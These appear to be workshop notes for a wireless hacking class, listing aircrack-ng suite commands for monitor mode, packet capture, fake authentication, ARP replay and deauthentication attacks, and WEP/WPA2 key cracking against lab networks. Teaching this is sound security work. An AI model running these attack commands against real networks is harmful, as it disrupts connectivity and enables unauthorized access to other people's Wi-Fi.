Wireless Workshop One

These examples are for the most basic WEP and WPA2 example networks from class.

These attacks will not work for all instances of WEP and WPA2

changes and updates will be applied as needed

TOOL INTRO


**airmon-ng**

#first run just airmon-ng to see your interfaces
#see all your devices and assigned drivers
#now start the device you want
#one is great and two is better
#avoid using wlan0 the best you can
#wlan0 is usually your internal card and does not always work for hacker mode (monitor mode and packet injection)

airmon-ng

airmon-ng start wlanX

#if you have problems you need to check or check kill
#usually wpasuplicant or Network Manager is a problem
#these items doing normal computer things interfere with hackermode


**airodump-ng**

#now lets see networks

airodump-ng wlanXmon

#now lets see more

airodump-ng -b abg wlanXmon

#MORE FILTERING

#we can do further with 

-2 or --ht20
-3 or --ht40+ 
-4 or --ht40-

#we can also go by channel
#by default airodump-ng will channel hop
#if something happens when you are not on a channel you will not capture it

airodump-ng -c X wlanXmon

#or by BSSID (MAC ADDRESS)

airodump-ng -d <bssid> wlanXmon

#or --bssid instsead of -d

#or by ESSID (SSID or Human Readable Name)

airodump-ng -N <SSID>

#or --essid

#now lets collect 

airodump-ng wlanXmon -w <filename> 

#lets try another
#do you see more devices when running this command?

airodump-ng -b abg -R WIFI_LAB wlanXmon

#watch the channel hopping and the time
#targeted channels helps because of the delay on scanning


#put it all together when ready

airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -r test wlanXmon

airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -b abg -r test wlanXmon

#isolate and filter down to just what you need to make your pcap more managable

**aireplay-ng**
#note the new flags for the new tool so -b wont be the same as airodump-ng

#TEST YOUR INTERFACE
#-9 is testing flag
aireplay-ng -9 <INT>


REPLAY OPTIONS
#-a <BSSID>
#-d <destination MAC> (AP)
#-h <source MAC> (INT MAC)
#-e <ESSID>


#-1 Fake Auth
#-3 ARP Replay

# 2 4 5 6 7 8 are useful for specific attacks and network situations.  Today we are just doing 1 and 9 for the class

#Fake Auth
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <ATTACK INT MAC> <INT>

#Replay Attack
aireplay-ng -3 -b <BSSID> -h <ATTACK INT MAC> <INT>

#Deauth Attack
aireplay-ng -0 <NUM OF DEAUTH> -a <BSSID> -c <DEST MAC> <INT>

**aircrack-ng**

#-w for wordlist for doing WPA and WPA2

#just need to run aircrack on cap if WEP

aircrack-ng <name>.cap

#if cracking handshake you need a wordlist

aircrack-ng -w <wordlist> <name>.cap
